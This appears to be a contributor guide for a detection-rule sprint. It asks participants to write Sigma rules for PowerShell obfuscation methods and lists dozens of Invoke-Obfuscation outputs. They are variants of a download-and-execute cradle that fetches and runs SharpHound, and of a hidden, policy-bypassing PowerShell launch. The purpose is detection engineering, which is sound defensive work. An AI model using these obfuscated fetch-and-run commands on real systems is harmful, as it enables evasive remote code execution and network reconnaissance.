## Hello, fellow OSCD participant!
This is your guide on how you can help us all with soving this issue.     
You can pick up some of the methods of PowerShell command and script obfuscation provided by the [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) framework below and develop Sigma rules for them. You will need to use [regular expressions](https://github.com/Neo23x0/sigma/wiki/Specification#types) in Sigma rules.

### Original command #1 (before obfuscation)
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
```
### Original command #2 (before obfuscation)
```powershell
powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1
```

### Invoke-Obfuscation module premise
```powershell
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
# Premise for command #1
SET SCRIPTBLOCK Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
# Premise for command #2
SET SCRIPTBLOCK powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1
```
#### Just pick the obfuscation method and the relevant сases you prefer and develop Sigma rule(s) for them. When you're done, create a Pull Request to OSCD Sigma branch and specify this issue's number and the case numbers you've solved:  
(*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1,3"*) <br/> (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1-15"*) <br/>
#### A little tip for your regex development:
you can copy the results from all cases for one or more obfuscation methods and paste them in [regex101](https://regex101.com/) to find possible similarities while developing a regex (you can save your progress there and even apply a dark theme (: ). 

## Contents
##### SINGLE OBFUSCATION
  - [TOKEN OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#token-obfuscation)
  - [STRING OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#string-obfuscation)
  - [ENCODING OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#encoding-obfuscation)
  - [COMPRESS OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#compress-obfuscation)
  - [PS LAUNCHER OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#ps-launcher-obfuscation)
  - [CMD LAUNCHER OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#cmd-launcher-obfuscation)
  - [WMIC LAUNCHER OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#wmic-launcher-obfuscation)     
  - [RUNDLL LAUNCHER OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#rundll-launcher-obfuscation)
  - [VAR+ LAUNCHER OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#var-launcher-obfuscation)
  - [STDIN+ LAUNCHER OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#stdin-launcher-obfuscation)
  - [CLIP+ LAUNCHER OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#clip-launcher-obfuscation)
  - [VAR++ LAUNCHER OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#var-launcher-obfuscation-1)
  - [STDIN++ LAUNCHER OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#stdin-launcher-obfuscation-1)
  - [CLIP++ LAUNCHER OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#clip-launcher-obfuscation-1)
  - [RUNDLL++ LAUNCHER OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#rundll-launcher-obfuscation-1)
  - [MSHTA++ LAUNCHER OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#mshta-launcher-obfuscation)
##### MULTIPLE OBFUSCATION
  - *Will be added later as well as the [second original command](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#original-command-before-obfuscation) (to find similarities in one obfuscation method for different commands)*

### TOKEN OBFUSCATION
[Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
| Case # | Option #1 | Option #2 | Option #3 | Command #1 Result | Command #2 Result |
| :---: | :---: | :---: | :---: | :--- | :--- |
| 1 | TOKEN | TOKEN\STRING | TOKEN\STRING\1 | Invoke-Expression (New-Object Net.WebClient).DownloadString(('ht'+'tp'+'s://raw.gith'+'ubus'+'e'+'rcont'+'ent.com/BloodHo'+'und'+'A'+'D'+'/B'+'loo'+'dHo'+'un'+'d/a7'+'e'+'a5'+'36'+'387'+'0d92'+'5bc31'+'d'+'3'+'a441a361f38b0a'+'add0b'+'/Inge'+'s'+'tors/'+'Shar'+'pHou'+'n'+'d'+'.ps'+'1')); Invoke-BloodHound | There were not any String tokens to further obfuscate
| 2 | TOKEN | TOKEN\STRING | TOKEN\STRING\2 | Invoke-Expression (New-Object Net.WebClient).DownloadString(("{16}{2}{17}{26}{10}{0}{3}{19}{7}{9}{6}{5}{8}{20}{23}{4}{18}{12}{24}{22}{11}{1}{25}{21}{13}{15}{14}"-f 'ntent.com/Blo','s/','/','o','441','ea5363870','nd/a7','ood','d92','Hou','.githubuserco','Ingestor','38b','und.p','1','s','https:','/r','a361f','dHoundAD/Bl','5bc3','o','aadd0b/','1d3a','0','SharpH','aw')); Invoke-BloodHound | There were not any String tokens to further obfuscate
| 3 | TOKEN | TOKEN\COMMAND | TOKEN\COMMAND\1 | i`N`VOKe-E`xpRe`S`SIOn (new-`obJE`cT Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); InVoKe-b`l`OOdH`o`U`ND | POWErsh`eLL.`e\`xe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1
| 4 | TOKEN | TOKEN\COMMAND | TOKEN\COMMAND\2 | .('Invoke-E'+'xpr'+'es'+'s'+'i'+'on') (&('New-Obj'+'e'+'c'+'t') Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); .('Invo'+'ke-B'+'loodHoun'+'d') | .('po'+'wersh'+'el'+'l.exe') -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1
| 5 | TOKEN | TOKEN\COMMAND | TOKEN\COMMAND\3 | .("{1}{0}{2}{3}"-f 'oke','Inv','-','Expression') (&("{2}{3}{0}{1}" -f 'jec','t','N','ew-Ob') Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); &("{3}{1}{0}{2}"-f 'd','loo','Hound','Invoke-B') | .("{2}{0}{3}{1}"-f 'ow','shell.exe','p','er') -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1
| 6 | TOKEN | TOKEN\ARGUMENT | TOKEN\ARGUMENT\1 | Invoke-Expression (New-Object net.weBclIEnt).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound | powershell.exe -executionpolicy BYPaSS –noprofile –windowstyle HiDDEN –file SCRIpT.ps1
| 7 | TOKEN | TOKEN\ARGUMENT | TOKEN\ARGUMENT\2 | Invoke-Expression (New-Object Net`.W`eBcL`ie`NT).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound | powershell.exe -executionpolicy b`yPAss –noprofile –windowstyle HI`DD`EN –file Sc`RIP\`T.pS1
| 8 | TOKEN | TOKEN\ARGUMENT | TOKEN\ARGUMENT\3 | Invoke-Expression (New-Object ('Net'+'.W'+'ebClie'+'nt')).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound | powershell.exe -executionpolicy ('by'+'p'+'ass') –noprofile –windowstyle ('hidde'+'n') –file ('sc'+'ript.'+'ps1')
| 9 | TOKEN | TOKEN\ARGUMENT | TOKEN\ARGUMENT\4 | Invoke-Expression (New-Object ("{2}{3}{1}{0}"-f'ent','ebCli','Net.','W')).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound | powershell.exe -executionpolicy ("{0}{1}"-f'bypas','s') –noprofile –windowstyle ("{1}{0}" -f 'en','hidd') –file ("{0}{1}{2}" -f 'scrip','t.p','s1')
| 10 | TOKEN | TOKEN\MEMBER | TOKEN\MEMBER\1 | Invoke-Expression (New-Object Net.WebClient).DOwNlOadsTriNg('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound | There were not any Member tokens to further obfuscate
| 11 | TOKEN | TOKEN\MEMBER | TOKEN\MEMBER\2 | Invoke-Expression (New-Object Net.WebClient)."Dow`NL`oaDST`R`ING"('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound | There were not any Member tokens to further obfuscate
| 12 | TOKEN | TOKEN\MEMBER | TOKEN\MEMBER\3 | Invoke-Expression (New-Object Net.WebClient).('Dow'+'nloadStrin'+'g').Invoke('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound | There were not any Member tokens to further obfuscate
| 13 | TOKEN | TOKEN\MEMBER | TOKEN\MEMBER\4 | Invoke-Expression (New-Object Net.WebClient).("{3}{2}{1}{0}" -f'g','nloadStrin','ow','D').Invoke('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound | There were not any Member tokens to further obfuscate
| 14 | TOKEN | TOKEN\WHITESPACE | TOKEN\WHITESPACE\1 | Invoke-Expression (  New-Object Net.WebClient ).DownloadString(  'https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1') ;   Invoke-BloodHound | There were not any Whitespace tokens to further obfuscate
| 15 | TOKEN | TOKEN\ALL | TOKEN\ALL\1 | &("{4}{2}{1}{0}{5}{3}"-f'-Expres','oke','v','on','In','si') (.("{0}{3}{1}{2}"-f'New-O','j','ect','b') ("{1}{0}{4}{2}{3}"-f 'e','N','Cli','ent','t.Web')).("{0}{2}{1}" -f'D','loadString','own').Invoke(("{12}{0}{7}{14}{17}{1}{16}{6}{5}{15}{8}{10}{3}{18}{11}{2}{4}{13}{19}{20}{9}" -f'aw.g','erconten','1d3a44','dHound/a7','1a36','Bloo','.com/','ith','Ho','estors/SharpHound.ps1','undAD/Bloo','25bc3','https://r','1f38b0','ubu','d','t','s','ea5363870d9','aadd0b','/Ing')); &("{1}{4}{2}{3}{5}{0}" -f 'Hound','Inv','lo','o','oke-B','d') | &("{3}{0}{2}{1}" -f'wer','xe','shell.e','po') -executionpolicy ("{1}{0}{2}"-f'a','byp','ss') –noprofile –windowstyle ("{1}{0}" -f 'dden','hi') –file ("{0}{2}{1}" -f'scrip','ps1','t.')

### STRING OBFUSCATION
[Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
| Case # | Option #1 | Option #2 | Option #3 | Command #1 Result | Command #2 Result |
| :---: | :---: | :---: | :---: | :--- | :--- |
| 16 | STRING | STRING\1 | - | &( ([stRING]$VeRBoSePrEfErencE)[1,3]+'x'-Join'')((('Invok'+'e-E'+'xpress'+'i'+'on'+' ('+'N'+'ew-Ob'+'jec'+'t Net.'+'WebClien'+'t).D'+'ownloa'+'dString'+'('+'{0}https://raw.githu'+'b'+'u'+'se'+'rcont'+'e'+'nt.co'+'m/BloodHoundA'+'D/BloodHound/a'+'7ea'+'53'+'6'+'3'+'870d925'+'bc31d3a441a'+'361f38b0'+'aadd0b/Ing'+'estor'+'s/SharpHound.ps1{0}); I'+'n'+'vo'+'ke'+'-'+'BloodHou'+'n'+'d')-F [ChaR]39) ) |  ('power'+'s'+'hell.e'+'xe -exe'+'cutionpolicy'+' b'+'ypa'+'ss '+'–'+'nop'+'r'+'ofile –windowstyle'+' hi'+'dden '+'–fil'+'e s'+'c'+'ript.ps'+'1') |& ( ([sTriNG]$VERBOseprEfERenCe)[1,3]+'X'-JOIN'')
| 17 | STRING | STRING\2 | - |  (("{5}{38}{43}{10}{47}{49}{13}{36}{40}{6}{53}{19}{14}{33}{22}{23}{0}{39}{7}{25}{11}{35}{20}{8}{21}{34}{41}{44}{28}{26}{9}{27}{18}{55}{4}{3}{45}{1}{16}{37}{42}{50}{32}{30}{12}{31}{56}{46}{24}{17}{15}{52}{29}{51}{2}{48}{54}" -f 'w.git','c31','voke','d','0','Invo','Client).Downl','bu','o','d','ion (New-Objec','rc','Inges','et.','in','ps','d3a441a','und.','7ea5','tr','tent.c','m/','VFhttps:','//ra','Ho','se','un','/a','loodHo','F); ','b/','t','0aadd0','g(G','Blo','on','We','361','ke','hu','b','odHo','f3','-Express','undAD/B','925b','p','t ','-B','N','8b','In','1GV','oadS','loodHound','36387','ors/Shar')).RepLAcE(([CHar]71+[CHar]86+[CHar]70),[STRiNG][CHar]39)\|IEx |  (("{14}{0}{16}{15}{3}{11}{7}{10}{9}{1}{5}{8}{13}{2}{12}{4}{6}" -f'owe','f',' ','ionpo','ile script.','ile –wind','ps1','cy bypas','o','nopro','s –','li','–f','wstyle hidden','p','e -execut','rshell.ex')) \| . ((gv '*mdR*').nAME[3,11,2]-join'')
| 18 | STRING | STRING\3 | - | SET  ("9"+"sca"+"Vi") (  [CHaR[ ] ]" ))93]RaHC[]GNirTs[,'ocD'(ecaLPEr.)'dnuo'+'HdoolB'+'-ekovn'+'I'+' '+';)ocD1sp.dnuoHpra'+'hS/srotsegnI/b0'+'d'+'daa0b83f163'+'a144a3d13cb529d0'+'783635ae7a/dnuoHdoolB/DAdnuoH'+'do'+'olB/mo'+'c.tnet'+'nocre'+'s'+'ub'+'u'+'hti'+'g.war//:sptt'+'hoc'+'D(gnirt'+'S'+'da'+'ol'+'nwoD.)t'+'neilC'+'be'+'W.te'+'N tcej'+'bO-weN'+'( noi'+'sserp'+'xE-ekovnI'(( xEI"  ); [ArraY]::REVErSe((GEt-VARIAble ("9"+"sCA"+"vI")  -va ));. ( ([strInG]$VerboSepreFERENcE)[1,3]+'x'-joIn'')([STrING]::jOIn( '', (GEt-VARIAble ("9"+"sCA"+"vI")  -va )) ) | $nYp  = [cHAR[ ]] " ))'1sp.tpircs eli'+'f– nedd'+'ih '+'elytswodniw– eli'+'f'+'or'+'pon'+'– s'+'s'+'ap'+'y'+'b yc'+'i'+'lopn'+'oituce'+'xe-'+' '+'e'+'xe.ll'+'ehsre'+'wop'(()'X'+]31[diLlehs$+]1[DIlleHs$ ( & " ;  [aRRaY]::revErsE((  GET-ChildiTem  ('var'+'iAbLe:N'+'Y'+'P') ).VALUe);.( $psHoME[21]+$pshOMe[34]+'x') ([sTriNg]::jOIn( '',(  GET-ChildiTem  ('var'+'iAbLe:N'+'Y'+'P') ).VALUe) )

### ENCODING OBFUSCATION
[Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
| Case # | Option #1 | Option #2 | Option #3 | Command #1 Result | Command #2 Result |
| :---: | :---: | :---: | :---: | :--- | :--- |
| 19 | ENCODING | ENCODING\1 | - | [EncObf-case19-command1result](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/EncObf-case19-command1result) | [EncObf-case19-command2result](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/EncObf-case19-command2result) |
| 20 | ENCODING | ENCODING\2 | - | [EncObf-case20-command1result](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/EncObf-case20-command1result) | [EncObf-case20-command2result](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/EncObf-case20-command2result) |
| 21 | ENCODING | ENCODING\3 | - | [EncObf-case21-command1result](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/EncObf-case21-command1result) | [EncObf-case21-command2result](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/EncObf-case21-command2result) |
| 22 | ENCODING | ENCODING\4 | - | [EncObf-case22-command1result](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/EncObf-case22-command1result) | [EncObf-case22-command2result](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/EncObf-case22-command2result) |
| 23 | ENCODING | ENCODING\5 | - | [EncObf-case23-command1result](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/EncObf-case23-command1result) | [EncObf-case23-command2result](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/EncObf-case23-command2result) |
| 24 | ENCODING | ENCODING\6 | - | [EncObf-case24-command1result](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/EncObf-case24-command1result) | [EncObf-case24-command2result](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/EncObf-case24-command2result) |
| 25 | ENCODING | ENCODING\7 | - | [EncObf-case25-command1result](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/EncObf-case25-command1result) | [EncObf-case25-command2result](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/EncObf-case25-command2result) |
| 26 | ENCODING | ENCODING\8 | - | [EncObf-case26-command1result](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/EncObf-case26-command1result) | [EncObf-case26-command2result](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/EncObf-case26-command2result) |

### COMPRESS OBFUSCATION
[Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
| Case # | Option #1 | Option #2 | Option #3 | Command #1 Result | Command #2 Result |
| :---: | :---: | :---: | :---: | :--- | :--- |
| 27 | COMPRESS | COMPRESS\1 | - |  ( nEW-ObJEct  SYSTem.iO.sTReaMreaDEr( (nEW-ObJEct SySTEM.IO.COmpRESSIon.DEfLAtEsTream([SYsTEM.iO.memoRysTrEAM][sYsTem.CONvERT]::FrOMBaSe64sTrINg('TY67EoIwEEV/hU4sTMAoola+ZqTBgsJ6Q1ZAMcski/j5OlpoeWfOOXMz+6AbTg7PzqH3DdkgzHGYnPQVSw5yZHFGvWsbtDwWexpsS2AKdo2twlHN3PmVlA4GUTVc97r36Eqy/MZFSXe5bYnMkXprNvu/IWGBMFeJSheRWU7nulSxUTCbxaCS+KJSHQEYE2mZ2Qo9k/OyqMF1H1t0Ph6N10H2/f7LvgA='), [SYSTem.iO.COmPResSioN.ComPresSIoNmOde]::DeCOmprESs)),[sysTEM.TEXT.ENCOdInG]::AScII)).REaDtOeNd()\| & ( $shELLid[1]+$ShellId[13]+'x') |  (NEW-OBjECt iO.sTREamreAdER( (NEW-OBjECt  Io.ComPreSSiOn.DeFLatestrEAM([sySTem.Io.mEMOrYsTreaM] [COnveRt]::FRoMbasE64StrINg('HcnRCcAgDADRVbJABSdwljamGAhJMBbr9pX+HDzObVKPRiKJXoJjB5/Bpm7CuOBafkZAUfNuNwtBmazVZoy10bhWUij/CezsI3nkDw==' ),[IO.cOmPreSSIoN.coMPRESsIonModE]::dEcOmpreSs )) , [TexT.ENCodinG]::AscIi)).rEadtoENd()\|&( $ENv:CoMSpEC[4,24,25]-JoIn'')

### PS LAUNCHER OBFUSCATION
[Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
| Case # | Option #1 | Option #2 | Option #3 | Command #1 Result | Command #2 Result |
| :---: | :---: | :---: | :---: | :--- | :--- |
| 28 | LAUNCHER | LAUNCHER\PS | LAUNCHER\PS\0 | POWErshell   "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | Not relevant
| 29 | LAUNCHER | LAUNCHER\PS | LAUNCHER\PS\1 | PoWeRSheLl  -nOexIT   "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | Not relevant
| 30 | LAUNCHER | LAUNCHER\PS | LAUNCHER\PS\2 | pOwERsHEll  -noniN   "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | Not relevant
| 31 | LAUNCHER | LAUNCHER\PS | LAUNCHER\PS\3 | POWErShELl -nOL   "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | Not relevant
| 32 | LAUNCHER | LAUNCHER\PS | LAUNCHER\PS\4 | POWERShelL -NOPROfILe    "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | Not relevant
| 33 | LAUNCHER | LAUNCHER\PS | LAUNCHER\PS\5 | powerShElL  -co  "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | Not relevant
| 34 | LAUNCHER | LAUNCHER\PS | LAUNCHER\PS\6 | PowerSHeLl  -WIndOWstYle hID   "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | Not relevant
| 35 | LAUNCHER | LAUNCHER\PS | LAUNCHER\PS\7 | pOWERSHeLL -eXEcutIo  ByPasS   "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | Not relevant
| 36 | LAUNCHER | LAUNCHER\PS | LAUNCHER\PS\8 | c:\wINdoWS\sySWOw64\WinDoWsPOWerSHeLL\v1.0\powERSHELl.exe   "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | Not relevant

### CMD LAUNCHER OBFUSCATION
[Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
| Case # | Option #1 | Option #2 | Option #3 | Command #1 Result | Command #2 Result |
| :---: | :---: | :---: | :---: | :--- | :--- |
| 37 | LAUNCHER | LAUNCHER\CMD | LAUNCHER\CMD\0 | Cmd/C PoWERsHELl    "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | CmD.ExE /c  PoWErSHell    "powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 38 | LAUNCHER | LAUNCHER\CMD | LAUNCHER\CMD\1 | cMd.eXe  /C   pOwerSHEll  -Noex   "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | cMd.Exe/c pOWErshelL  -NOEX   "powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 39 | LAUNCHER | LAUNCHER\CMD | LAUNCHER\CMD\2 | CmD/c pOwershelL  -nONInteract  "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | C:\WInDOWs\SYSteM32\CmD.eXe  /C   pOWeRsHELl  -NOninTErA    "powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 40 | LAUNCHER | LAUNCHER\CMD | LAUNCHER\CMD\3 | c:\winDowS\SYStem32\CMd.EXe   /c PowersHELl  -nOLO    "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | c:\WINdOwS\sYSTEm32\CMD  /C PoWERSheLl  -noL   "powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 41 | LAUNCHER | LAUNCHER\CMD | LAUNCHER\CMD\4 | C:\wiNDows\sySTEm32\CMd   /c PowErSHelL  -nOPRoFile   "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | cmD.EXE/C  POweRshell -NopROf   "powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 42 | LAUNCHER | LAUNCHER\CMD | LAUNCHER\CMD\5 | cMd /C   PoWERSHeLl  -ComMaN   "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | cmd /C POwErsHeLL -CoM   "powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 43 | LAUNCHER | LAUNCHER\CMD | LAUNCHER\CMD\6 | C:\wIndoWS\SYsTem32\cMd.EXe   /c   PoWeRSheLL -wiNdOwsTYLE  HIDdEn   "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | CMd.eXE/c   powErsHell  -WIndowstylE  hIDDEn  "powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 44 | LAUNCHER | LAUNCHER\CMD | LAUNCHER\CMD\7 | cmD.ExE/cPOWERSHell  -ExecutiONP  bYpass   "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | c:\WiNDowS\sysTem32\CMD.ExE   /C   POwershELL -eXEcUtIoNpOlic  bYPaSS  "powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 45 | LAUNCHER | LAUNCHER\CMD | LAUNCHER\CMD\8 | c:\windoWS\sYSTEM32\Cmd.eXe   /c   C:\WindOws\sysWow64\WINdowspOWERshelL\V1.0\poWersheLl.ExE    "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | cMd  /C C:\WIndOws\syswOw64\WInDowSpoWersHEll\v1.0\pOwersHeLL.exe   "powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"

### WMIC LAUNCHER OBFUSCATION
